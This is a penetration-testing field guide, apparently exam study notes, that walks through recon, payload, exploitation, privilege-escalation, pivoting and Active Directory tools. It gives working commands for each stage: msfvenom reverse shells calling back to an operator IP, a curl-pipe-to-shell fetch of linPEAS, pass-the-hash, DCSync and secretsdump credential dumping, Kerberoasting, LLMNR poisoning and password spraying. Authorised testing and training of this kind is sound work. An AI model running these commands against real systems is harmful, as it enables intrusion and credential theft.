Stage 1

Reconnaissance

Map the target: hosts, open ports, services, versions, and the people and names around them. Passive OSINT first, then active scanning and enumeration.

Host discovery and port scanningService and version enumerationContent and subdomain discoveryOSINT and footprinting
ffuf Web fuzzing A fast web fuzzer that puts the FUZZ keyword anywhere in a request: paths, parameters, headers, POST bodies and Host for vhosts. The flexible companion to Gobuster when you need recursion, filtering or to fuzz something other than a path. Reconnaissancehttphttps8044380808443fuzzingenumerationdirectoriesparameters

When to reach for it

Content discovery where you need more than a directory list: fuzzing a GET/POST parameter, a subdomain, a virtual host, or recursing into found directories. Put FUZZ where the wordlist should go.

Key flags

  • -u — URL, with FUZZ as the injection point.
  • -w list.txt — wordlist (add :KEYWORD to name it for multi-fuzz).
  • -H "Header: value" — add a header (use FUZZ here for vhosts).
  • -X POST -d "x=FUZZ" — method and body data.
  • -recursion -recursion-depth 2 — recurse into discovered directories.
  • -mc 200,301 — match these status codes; -fc 404 filters them out.
  • -fs 1234 / -fw / -fl — filter by response size, word or line count (hide a uniform "not found" page).
  • -ac — auto-calibrate filters from the baseline response.

Commands

Directory discovery, filtering the 404 size automatically:

bashffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac

Virtual host discovery (filter out the default response size):

bashffuf -u http://TARGET -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234

Fuzz a GET parameter value, then a parameter name:

bashffuf -u "http://TARGET/item?id=FUZZ" -w ids.txt -mc 200 -fc 404
ffuf -u "http://TARGET/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1234

Workflow

  1. Get a baseline: browse the app, note the size of a known-missing page.
  2. Fuzz directories with -ac so the baseline is filtered for you.
  3. Recurse into anything interesting (-recursion).
  4. Move from paths to parameters once you find a dynamic endpoint.
  5. Feed found parameters into the exploitation stage (injection, IDOR, LFI).

Notes

If every line comes back 200 with the same size, the app has a catch-all — filter on size/words (-fs/-fw) or use -ac. Threads default high; drop with -t against fragile targets. Wordlist choice matters more than the tool: match it to the stack.

Gobuster Web content discovery Brute-forces hidden web content: directories and files, DNS subdomains, and virtual hosts. Run it against any HTTP or HTTPS service once a port scan finds one. Reconnaissancehttphttps8044380808443enumerationfuzzingdirectoriessubdomains

When to reach for it

A web server is open (port 80, 443 or similar) and you need to find what is not linked from the homepage: admin panels, backup files, API paths, other virtual hosts. Point it at the service with a wordlist.

Key flags

  • dir / dns / vhost — the mode: directory brute force, DNS subdomains, or virtual hosts.
  • -u — target URL (dir/vhost mode).
  • -d — target domain (dns mode).
  • -w — wordlist path.
  • -x php,html,txt — file extensions to append to each word.
  • -t 50 — number of concurrent threads.
  • -k — skip TLS certificate verification (self-signed labs).
  • -b 404,403 — blacklist these status codes (hide noise).
  • -o out.txt — write results to a file.

Commands

Directory and file discovery:

bashgobuster dir -u http://TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50 -o gobuster-dir.txt

DNS subdomain discovery (needs a resolvable domain):

bashgobuster dns -d TARGET.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50

Virtual host discovery (same IP, different Host: header):

bashgobuster vhost -u http://TARGET.com --append-domain \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

Workflow

  1. From the port scan, note every HTTP/HTTPS port and the server banner.
  2. Browse the site first; note the tech stack to choose extensions (-x).
  3. Run dir mode with a medium wordlist.
  4. If the host serves by name, run vhost to find other sites on the same IP.
  5. Feed interesting paths (login, upload, admin) into the next tool.

Notes

Pick the wordlist to fit the stack: a PHP app wants -x php, an IIS box wants asp,aspx. ffuf and feroxbuster cover the same ground with recursion and more filtering; keep one as a backup when results look thin.

NetExec Network and AD enumeration The successor to CrackMapExec. Sweeps a subnet for SMB, WinRM, LDAP, MSSQL and more, checks credentials across hosts, lists shares and users, and flags where a credential is a local admin. The workhorse of internal and Active Directory enumeration. Reconnaissancesmbwinrmldapmssqlrdpsshftp22214451351393896361433338959855986enumerationsmbactive-directorycredential-spray

When to reach for it

You are on an internal network with (or without) a credential and need the lay of the land: which hosts speak SMB, which shares are readable, which accounts are valid, and — the prize — where a credential has local admin. Run it across a range, not one host at a time.

Key flags

  • smb, winrm, ldap, mssql, ssh — the protocol module to use.
  • -u user / -u users.txt — username or list.
  • -p pass / -p passwords.txt — password or list.
  • -H hash — authenticate with an NTLM hash (pass-the-hash).
  • --local-auth — treat credentials as local, not domain.
  • --shares — list shares and the access the credential has.
  • --users, --groups, --pass-pol — enumerate domain users, groups, password policy.
  • --sam, --lsa — dump local secrets (needs admin).
  • -x "cmd" / -X "ps" — run a command (needs admin).

Commands

Sweep a subnet for SMB and read the host banners (no credential needed):

bashnetexec smb 10.10.10.0/24

Validate a credential across every host; (Pwn3d!) marks local admin:

bashnetexec smb 10.10.10.0/24 -u jsmith -p 'Winter2026!'

List shares the credential can reach:

bashnetexec smb 10.10.10.0/24 -u jsmith -p 'Winter2026!' --shares

Pass-the-hash, local admin check:

bashnetexec smb TARGET -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth

Enumerate the domain (users, groups, password policy):

bashnetexec smb DC01 -u jsmith -p 'Winter2026!' --users --groups --pass-pol

Workflow

  1. Unauthenticated sweep: find SMB hosts, signing status and the domain/host names.
  2. With a credential, spray it across the range to find where it is valid and where it is admin.
  3. On hosts you can read, list shares and loot them for config, scripts and credentials.
  4. Against a DC, enumerate users, groups and the password policy to plan a safe spray.
  5. Record every (Pwn3d!) — those are your footholds for the next stage.

Notes

A credential spray with -u users.txt -p onepassword is quiet; -u user -p passwords.txt risks lockout — mind the password policy you pulled with --pass-pol. SMB signing "False" on the host list is what makes a relay attack possible later. Dumping SAM/LSA and running commands needs admin and is noisy; save it for when you have the access and the authorisation.

Nmap Network scanning The port scanner. Finds live hosts, open ports, service versions and, through NSE scripts, a first pass of service enumeration. Usually the first command run against an in-scope network. Reconnaissancescanningenumerationhost-discoveryversion-detection

When to reach for it

First contact with an in-scope host or range. You want to know what is alive, what ports are open, and what is listening before you pick a direction. Run a fast sweep to find open ports, then a focused, deeper scan on just those ports.

Key flags

  • -sC — run the default NSE script set (safe, enumeration-focused).
  • -sV — probe open ports to determine service and version.
  • -p- — scan all 65,535 TCP ports (default is the top 1,000).
  • -p 22,80,445 — scan a specific list of ports.
  • --min-rate 1000 — send at least this many packets per second (speeds up large scans).
  • -sU — UDP scan (slow; use a small port list).
  • -Pn — skip host discovery, treat the host as up (use when ICMP is filtered).
  • -oA name — write results in all three formats (.nmap, .gnmap, .xml) with the given basename.
  • -A — aggressive: -sC -sV -O --traceroute in one flag.

Commands

A fast scan of all TCP ports, then a detailed scan of only the open ones:

bash# 1. Fast sweep: every TCP port, just find what's open
nmap -p- --min-rate 1000 -T4 TARGET -oA scans/all-ports

# 2. Pull the open ports out and scan them in depth
ports=$(grep -oP '\d+/open' scans/all-ports.gnmap | cut -d/ -f1 | paste -sd,)
nmap -p "$ports" -sC -sV TARGET -oA scans/deep

UDP top ports (slow, so keep the list short):

bashnmap -sU --top-ports 50 TARGET -oA scans/udp

Scan a whole range for a single service, output grep-able:

bashnmap -p 445 --open 10.10.10.0/24 -oG - | grep open

Workflow

  1. Confirm the target is in scope before scanning anything.
  2. Fast full-port TCP sweep to find open ports.
  3. Deep -sC -sV scan on only the open ports.
  4. Note service versions and feed each interesting service into its own tool (web to a content scanner, SMB to an SMB enumerator, and so on).
  5. Save all output (-oA) so the evidence is in the report.

Notes

-sC runs the default script category, which is safe and mostly read-only, but still touches the service. Scanning is noisy and will show up in the target's logs — expected on an authorised test, but keep the scope and timing in your notes. A closed or filtered result is evidence too: record it.

Stage 2

Weaponisation

Turn a finding into something that will run on the target: a payload, a crafted document, a wordlist tuned to the environment.

Payload generationWordlist and mask craftingEncoding and packing
msfvenom Payload generation The Metasploit payload generator. Produces reverse and bind shells in the format the target can run — exe, elf, war, aspx, raw shellcode — ready to pair with a listener. The standard way to make a payload for an authorised test. Weaponisationpayloadsshellcodereverse-shellencoders

When to reach for it

Exploitation found a way to run a file or code, and you need the file: a Windows exe, a Linux elf, a web shell (war/aspx/jsp), or raw shellcode to drop into an exploit. Generate it, host it, and start the matching listener.

Key flags

  • -p — the payload (e.g. windows/x64/meterpreter/reverse_tcp).
  • LHOST= / LPORT= — your listener address and port (payload options go as KEY=value).
  • -f — output format: exe, elf, war, aspx, raw, psh, python.
  • -o file — write to a file (otherwise stdout).
  • -a / --platform — architecture and platform.
  • -e / -i — encoder and iterations (evasion; modern defences see through most).
  • -b "\x00\x0a" — bad characters to avoid in shellcode.
  • --list payloads|formats|encoders — list what is available.

Commands

A staged Windows Meterpreter reverse shell as an exe:

bashmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe

A Linux elf reverse shell:

bashmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o shell.elf

A web payload for a file-upload foothold (war for Tomcat, aspx for IIS):

bashmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o shell.aspx

Raw shellcode for a buffer overflow, avoiding bad characters:

bashmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -b "\x00\x0a\x0d" -f python -v buf

Workflow

  1. Pick the payload format the foothold can execute (exe, war, aspx, raw).
  2. Set LHOST/LPORT to your machine and an outbound-friendly port (443 often works).
  3. Generate the file and host it (a simple web server, or an SMB share).
  4. Start the matching listener before delivery (Metasploit multi/handler, or nc for a plain shell).
  5. Deliver and catch the callback.

Notes

A staged payload (.../meterpreter/reverse_tcp) needs the Metasploit handler; a stageless one (reverse_winhttps, shell_reverse_tcp) is self-contained and easier with nc. Built-in encoders (shikata_ga_nai) rarely beat modern EDR — treat them as encoding, not evasion. Keep payloads inside the engagement scope and clean them up afterwards.

Stage 3

Delivery

Get the payload or request to the target: a web request, an upload, a phishing email, a captured protocol.

Web requests and uploadsPhishing and pretextProtocol capture and relay
Responder LLMNR/NBT-NS poisoning Answers LLMNR, NBT-NS and mDNS name-resolution requests on the local segment, so a host looking for a mistyped or missing name connects to you instead and hands over an NTLMv2 hash. A top source of first credentials on an internal test. Deliverysmbhttpldap13713813944553555353poisoningcredential-capturentlmrelay

When to reach for it

You are on the internal network with no credentials. Windows hosts fall back to LLMNR/NBT-NS when DNS fails (a typo, a stale share), broadcasting the name they want. Responder answers, the host authenticates to you, and you capture a crackable NTLMv2 hash — passively, just by listening.

Key flags

  • -I eth0 — the interface to listen on (required).
  • -A — analyse mode: watch and log requests without answering (safe first look).
  • -w — start the WPAD proxy (catches HTTP auth too).
  • -f — fingerprint the hosts that talk to you.
  • -v — verbose.
  • Config: edit Responder.conf to turn specific servers (SMB, HTTP) off, e.g. when relaying instead of capturing.

Commands

Analyse first — see who is asking for names, answer nothing:

bashsudo responder -I eth0 -A

Poison and capture hashes:

bashsudo responder -I eth0 -wf

Captured hashes are written under logs/ and printed to screen; crack them offline:

bashhashcat -m 5600 captured-ntlmv2.txt /usr/share/wordlists/rockyou.txt

Workflow

  1. Run in analyse mode (-A) to confirm LLMNR/NBT-NS traffic and gauge noise.
  2. Switch to poisoning and let it collect NTLMv2 hashes as hosts mis-resolve names.
  3. Take the hashes offline to a cracker — do not brute force online.
  4. If SMB signing is off on targets (check with NetExec), consider relaying the authentication instead of cracking it (turn Responder's SMB/HTTP servers off and use ntlmrelayx).
  5. Record the account, source host and time for the report.

Notes

Poisoning is intrusive and can break legitimate name resolution briefly — keep it inside the agreed window and scope, and prefer analyse mode until you are sure. NTLMv2 hashes are not pass-the-hash material; they must be cracked, or relayed. Machine-account hashes ($) rarely crack — relay those instead.

Stage 4

Exploitation

Trigger the flaw and get first execution or access: a service exploit, a web vulnerability, a weak credential.

Service and web exploitationCredential attacksPublic exploit use
Hydra Credential attacks Online password guessing against a live service: SSH, FTP, RDP, web login forms and many more. Use it for a targeted spray with a short, sensible list, not a blind dictionary run. Exploitationsshftphttphttpsrdpsmbmysqlmssqlpostgres2122804434451433330633895432brute-forcepassword-spraycredentialsauthentication

When to reach for it

You have a login-bearing service and either a username, a short user list, or a likely-weak default, and want to test credentials against it. Keep lists small and targeted: online guessing is slow and locks accounts.

Key flags

  • -l user / -L users.txt — a single username, or a file of them.
  • -p pass / -P passwords.txt — a single password, or a file of them.
  • -s PORT — non-standard port.
  • -t 4 — parallel tasks (keep low to avoid lockouts and false negatives).
  • -f — stop after the first valid pair for a host.
  • -V — verbose: show each attempt.
  • -e nsr — also try no password (n), login as password (s), reversed (r).

Commands

SSH with a known user and a password list:

bashhydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-100.txt \
  -t 4 -f ssh://TARGET

A password spray — one password across many users (quieter, avoids lockouts):

bashhydra -L users.txt -p 'Winter2026!' -t 4 ssh://TARGET

HTTP POST login form (the ^USER^/^PASS^ markers and a failure string):

bashhydra -L users.txt -P passwords.txt TARGET \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

Workflow

  1. Confirm the service and any lockout policy — a spray that locks every account fails the engagement goal.
  2. Build a short, relevant list (defaults, season+year, company name) rather than a giant dictionary.
  3. For web forms, log in once with a wrong password to capture the exact request and the failure string.
  4. Run with low threads (-t 4) and -f to stop on success.
  5. Record which pair worked and feed it into the next stage.

Notes

Online brute force is loud and slow, and account lockout is a real risk — prefer a one-password spray over a per-user dictionary. If you already have hashes, move offline (a hash cracker) instead. Always keep attempts within the rules of engagement.

Metasploit Framework Exploitation framework The exploitation framework: a searchable library of exploits and payloads, the multi/handler that catches shells, Meterpreter for post-exploitation, and routing for pivoting. The hub that ties weaponisation, exploitation and C2 together. Exploitationsmbhttphttpsrdpftp21804434453389exploitationmeterpreterhandlerpost-exploitation

When to reach for it

There is a known, matched vulnerability to exploit, or you need a reliable listener and post-exploitation shell. Metasploit runs the exploit, catches the callback, and gives you Meterpreter for the stage that follows. Also the easiest multi/handler for payloads you built with msfvenom.

Key flags

Inside msfconsole:

  • search <term> — find a module (by CVE, product, name).
  • use <module> — select it; info shows what it does.
  • show options / set OPT value — module settings (RHOSTS, LHOST, LPORT, TARGETURI).
  • set payload <payload> — choose the payload.
  • check — test if the target is vulnerable without firing.
  • run / exploit — launch; -j backgrounds it as a job.
  • sessions -l / sessions -i N — list and interact with shells.
  • In Meterpreter: getuid, sysinfo, hashdump, getsystem, background.

Commands

Catch a payload you generated with msfvenom:

bashmsfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 443; run"

A typical module run (set the target, payload and listener, then fire):

textmsf6 > search type:exploit name:vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.10.10.5
msf6 > check
msf6 > run

Pivot through a session to reach a second network:

textmsf6 > sessions -i 1
meterpreter > run autoroute -s 172.16.5.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > run

Workflow

  1. Identify the exact vulnerable product and version from the recon stage.
  2. search for a matching module; read info and prefer modules with a check.
  3. Set RHOSTS, the payload and LHOST/LPORT; run check before run.
  4. On a session, drop to Meterpreter: getuid, sysinfo, then enumerate for privilege escalation.
  5. To go deeper, add a route through the session and run a SOCKS proxy for your other tools.

Notes

check first where the module supports it — some exploits crash the service. Keep payloads matched to the handler (staged vs stageless). Metasploit is powerful but loud; for the CPTS exam mindset, understand the manual exploit behind the module so you can reproduce it without the framework. Stay within scope and clean up sessions and artefacts afterwards.

sqlmap SQL injection Automates finding and exploiting SQL injection. Confirms the flaw, fingerprints the database, dumps data, and — where the configuration allows — reads files or gets command execution. Point it at a request you suspect is injectable. Exploitationhttphttpsmysqlmssqlpostgres804438080143333065432sql-injectiondatabaseexploitationweb

When to reach for it

A parameter looks injectable (an error on a quote, a different response to 1 AND 1=1 vs 1 AND 1=2). sqlmap confirms it and does the tedious extraction. Capture the exact request first so sqlmap tests the real thing, cookies and all.

Key flags

  • -u "URL" — target URL with the parameter.
  • -r request.txt — use a saved raw HTTP request (best for POST, headers, cookies).
  • -p param — test only this parameter.
  • --data "a=1&b=2" — POST body.
  • --cookie, --headers — session and custom headers.
  • --batch — take default answers, no prompts.
  • --level 1-5, --risk 1-3 — how hard to test (higher finds more, slower, riskier).
  • --dbs, --tables, --columns, --dump — enumerate and extract.
  • -D db -T table -C col — scope the extraction.
  • --os-shell, --file-read — command execution or file read where supported.

Commands

Test a GET parameter and list databases:

bashsqlmap -u "http://TARGET/item?id=1" -p id --batch --dbs

Use a saved request (grab it from the browser or Burp) — handles POST, cookies, headers:

bashsqlmap -r request.txt --batch --level 3 --risk 2 --dbs

Dump a specific table:

bashsqlmap -r request.txt -D appdb -T users --dump --batch

Workflow

  1. Find the candidate parameter manually; save the full request to request.txt.
  2. Run sqlmap on the request with --batch to confirm injectability and DBMS.
  3. Enumerate --dbs, then the interesting database's --tables and --columns.
  4. Dump only what the engagement needs (credentials, proof) — not the whole database.
  5. If the DBMS and privileges allow, try --os-shell for execution, noting it is far noisier.

Notes

Start at low --level/--risk and raise only if needed — high risk sends destructive test payloads. Always prefer -r request.txt over -u for anything with a session, so you test as an authenticated user. Dumping entire databases of real data on an engagement is rarely in scope; extract proof, not everything.

Stage 5

Installation

Make access durable and usable: a shell upgrade, a foothold, local privilege escalation, persistence.

Shell handling and upgradesLocal privilege escalationPersistence
PEASS-ng (linPEAS / winPEAS) Privilege escalation enumeration The privilege-escalation scouts. linPEAS and winPEAS enumerate a host for local privesc routes — weak permissions, stored credentials, misconfigured services, sudo and SUID, scheduled tasks — and colour-code the most promising findings. Run one the moment you land a shell. Installationprivilege-escalationenumerationpost-exploitationlocal

When to reach for it

You have a low-privileged shell and want the fastest map of local privilege-escalation routes. PEASS checks the hundreds of things you would otherwise check by hand and highlights the ones worth chasing. Run it, read the red/yellow, then verify by hand.

Key flags

linPEAS:

  • -a — all checks (thorough, slower).
  • -s — stealth/quieter run.
  • -e — extra/heavy enumeration.

winPEAS: choose the build (winPEASx64.exe, or the .bat); pass check groups like systeminfo, userinfo, servicesinfo, or quiet to trim output.

Commands

Get linPEAS onto the target and run it (host it from your box, pull it on the target):

bash# on your machine
python3 -m http.server 8000
# on the target
curl http://10.10.14.5:8000/linpeas.sh | sh

Run it from disk and keep a log:

bash./linpeas.sh -a | tee linpeas.txt

winPEAS on a Windows foothold:

textC:\> winPEASx64.exe quiet servicesinfo userinfo > winpeas.txt

Workflow

  1. Land the shell and get a stable TTY first (PEASS output is long).
  2. Transfer and run the right PEAS for the OS; save the output.
  3. Read the highest-signal findings first (red/yellow): credentials, writable service binaries, sudo rules, SUID, cron/tasks.
  4. Pick one route and verify it manually — PEASS flags candidates, it does not exploit.
  5. Escalate, then re-run your enumeration as the new user.

Notes

PEASS is noisy on disk and in logs; on a monitored host prefer the stealth options or targeted manual checks (sudo -l, find / -perm -4000, schtasks). It points at candidates — always confirm a finding is real before reporting it. Keep a copy of the output as evidence for the write-up.

Stage 6

Command & Control

Operate the foothold: a stable channel back to the operator, tasking, and tunnelling to reach deeper.

C2 frameworksTunnelling and pivotingProxying
Chisel Tunnelling and pivoting A fast TCP/UDP tunnel over HTTP, in a single Go binary for every platform. Builds a SOCKS proxy or port-forward through a compromised host so your tools on the outside can reach an internal network you otherwise cannot touch. Command & Controlpivotingtunnellingsocksport-forward

When to reach for it

You have a foothold on a host that can see an internal subnet you cannot reach directly. Chisel turns that host into a pivot: a reverse SOCKS proxy brings the whole subnet to your attacking machine, or a port-forward exposes one internal service.

Key flags

  • server / client — the two roles.
  • --reverse (server) — allow clients to request reverse tunnels (the usual pivot direction).
  • -p 8080 — the port the server listens on.
  • --socks5 — expose a SOCKS5 proxy endpoint.
  • R:socks (client) — reverse SOCKS proxy back through the server.
  • R:LPORT:host:PORT — reverse-forward an internal host:PORT to your local LPORT.

Commands

Reverse SOCKS pivot — run the server on your box, the client on the foothold:

bash# your attacking machine (reachable by the foothold)
./chisel server --reverse -p 8080

# on the compromised host (pulled over from your machine)
./chisel client 10.10.14.5:8080 R:socks

Point your tools at the SOCKS proxy (default 127.0.0.1:1080) via proxychains:

bashproxychains -q nmap -sT -Pn -p 445,3389 172.16.5.0/24

Forward a single internal service to your localhost instead:

bash# on the foothold
./chisel client 10.10.14.5:8080 R:3389:172.16.5.19:3389
# now 127.0.0.1:3389 on your box reaches the internal RDP host

Workflow

  1. From the foothold, confirm which internal subnet it can reach (ip route, ifconfig).
  2. Start the Chisel server on your machine; transfer the client to the foothold.
  3. Bring up a reverse SOCKS proxy, or forward the specific port you need.
  4. Run your external tools through proxychains (use -sT TCP connect scans through SOCKS).
  5. Tear the tunnel down when done and record the pivot path for the report.

Notes

SOCKS carries TCP cleanly; UDP and ICMP do not tunnel, so some scans and ping will not work through the proxy — use TCP connect scans. Match the client and server versions. The tunnel is an obvious outbound HTTP connection on the foothold; keep it within scope and remove the binary afterwards.

When to reach for it

You have a domain foothold and want to know the route to the top. AD privilege relationships are too tangled to read by hand; BloodHound collects them and answers "from this user, what is the shortest path to Domain Admin?" and "who can reset this account's password?".

Key flags

Collection with the Python collector (bloodhound-python), run from Linux:

  • -u user -p pass — domain credential.
  • -d domain.local — the domain.
  • -ns 10.10.10.5 / -dc DC01 — the DNS/DC to query.
  • -c All — all collection methods (sessions, ACLs, trusts, and more).

In the BloodHound UI: run the built-in queries, or mark nodes Owned / High Value and use "Shortest paths to Domain Admins".

Collect from Linux with a domain credential:

bashbloodhound-python -u jsmith -p 'Winter2026!' -d corp.local -ns 10.10.10.5 -c All

textC:\> SharpHound.exe -c All -d corp.local

Load the resulting JSON/zip into the BloodHound UI, then run, for example, the "Shortest Paths to Domain Admins" query after marking your user Owned.

Workflow

  1. Collect with -c All from any valid domain account.
  2. Import the data; mark the accounts and hosts you already control as Owned.
  3. Run "Shortest paths from Owned principals to Domain Admins".
  4. Read each edge (e.g. GenericAll, AddMember, ForceChangePassword, session on a privileged host) — each is a concrete next step.
  5. Execute the first edge with the right tool (Impacket, NetExec), then re-mark and re-query.

Notes

The graph is only as current as the collection — sessions especially go stale, so recollect after you change the environment. Evil-WinRM Remote access (WinRM) A clean interactive shell over WinRM (Windows Remote Management). Give it a password or an NTLM hash and, if the account is in Remote Management Users, you get a PowerShell session with handy upload, download and in-memory script loading built in. When to reach for it

You have a credential or hash for an account that can use WinRM on a host (port 5985/5986 open; member of Remote Management Users or admin). Evil-WinRM turns that into a usable PowerShell session — the common way to "log in" to a Windows box from Linux after you crack or dump a credential.

Key flags

  • -i HOST — target.
  • -u user — username.
  • -p pass — password, or -H hash — NTLM hash (pass-the-hash).
  • -s /path/scripts — a local folder of PowerShell scripts to load into memory with Bypass-4MSI.
  • -e /path/exes — a local folder of executables for the Invoke-Binary helper.
  • -S — use HTTPS (port 5986).

Inside the session: upload local remote, download remote local, menu (list the extra commands).

Commands

Connect with a password:

bashevil-winrm -i 10.10.10.5 -u jsmith -p 'Winter2026!'

Pass-the-hash (no password needed):

bashevil-winrm -i 10.10.10.5 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

Upload a file from the session:

text*Evil-WinRM* PS C:\> upload /home/kali/winPEASx64.exe C:\Windows\Temp\wp.exe

Workflow

  1. Confirm WinRM is open (NetExec winrm module) and the credential works there.
  2. Connect with the password or hash.
  3. Enumerate as the user (whoami /all, groups); upload your privesc tooling if needed.
  4. Escalate, then reconnect as the higher-privileged account.
  5. Keep a note of the credential, host and access level for the report.

Notes

The account must be allowed WinRM (Remote Management Users or admin) — a valid credential alone is not enough. Loading scripts/binaries in memory still meets endpoint defences on hardened hosts. Prefer HTTPS (-S) where 5986 is the one open. Clean up anything you upload.

Impacket Windows and AD protocol tooling A toolbox of Python scripts that speak Windows protocols directly. secretsdump pulls hashes, the exec scripts (psexec, wmiexec) give remote shells, and GetUserSPNs/GetNPUsers pull Kerberos tickets to crack. The backbone of Active Directory attacks from Linux. Actions on Objectivessmbkerberosldapmssqlrpc881351394453891433credential-dumpinglateral-movementkerberosdcsync

When to reach for it

You have a domain credential or hash and a goal: dump more credentials, move to another host, or get crackable Kerberos tickets. Impacket does each over the wire from your Linux box, no agent on the target.

Key flags

Credentials are given as DOMAIN/user:password@HOST, or with -hashes LM:NT for pass-the-hash.

  • secretsdump.py — dump SAM, LSA and, with the right rights, the whole domain via DCSync (-just-dc).
  • psexec.py / wmiexec.py / smbexec.py — remote command execution (psexec drops a service; wmiexec is quieter).
  • GetUserSPNs.py -request — Kerberoast: pull service tickets for offline cracking.
  • GetNPUsers.py — AS-REP roast accounts that don't require pre-auth.
  • -k -no-pass — use a Kerberos ticket from the environment (KRB5CCNAME).

Commands

Dump secrets from a host (local admin), or the whole domain from a DC (DCSync rights):

bashsecretsdump.py CORP/administrator:'Passw0rd!'@10.10.10.5
secretsdump.py -just-dc CORP/administrator:'Passw0rd!'@DC01

Pass-the-hash to a shell on a host where the hash is admin:

bashwmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/administrator@10.10.10.5

Kerberoast — request service tickets to crack offline:

bashGetUserSPNs.py -request -dc-ip 10.10.10.5 CORP/jsmith:'Winter2026!'
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt

Workflow

  1. From a valid domain credential, enumerate SPNs and AS-REP-roastable accounts; crack what comes back offline.
  2. Where a credential is local admin (NetExec told you), dump secrets for more material.
  3. Reuse hashes with the exec scripts (pass-the-hash) to move laterally — prefer wmiexec over psexec for noise.
  4. With Domain Admin or DCSync rights, secretsdump -just-dc for the krbtgt and the domain.
  5. Record every credential, its source and the technique for the report.

Notes

psexec is reliable but noisy (creates a service, writes to disk); wmiexec and smbexec are quieter. NTLM hashes are pass-the-hash material; Kerberos tickets (roasting output) must be cracked. DCSync and krbtgt extraction are high-impact — only with explicit authorisation, and documented carefully.
